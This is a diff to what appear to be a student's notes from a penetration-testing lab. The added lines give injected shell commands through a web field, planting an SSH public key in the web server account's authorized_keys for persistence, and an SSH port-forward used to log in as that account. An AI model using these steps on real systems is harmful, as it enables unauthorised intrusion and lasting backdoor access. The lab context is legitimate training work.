@@ -318,3 +318,28 @@ www-data
 /home/comrade/Dekstop/network/.mapkey.txt
 ; find / -name *"inventory"*
 cat <fileNameShit>
+
+; ls -la /var/www/
+; ls -la /var/www/.ssh/authorized_keys
+*if doesnt exsist, mkdir that bitch
+
+on opStation
+ssh-keygen -t rsa
+student@lin-ops:/home$ ls /home/student/.ssh
+student@lin-ops:/home$ cat /home/student/.ssh/id_rsa.pub.pub 
+-copy this whole thing-
+; mkdir /var/www/.ssh/
+; echo "publicCopiedKey" >> /var/www/.ssh/authorized_keys
+ssh -S /tmp/jump user -O forward -L 40000:192.168.28.100:2222
+ssh www-data@localhost -p 40000
+
+-now on www-data@extranet-
+-tunnels here
+
+end here-
+
+
+
+
+
+
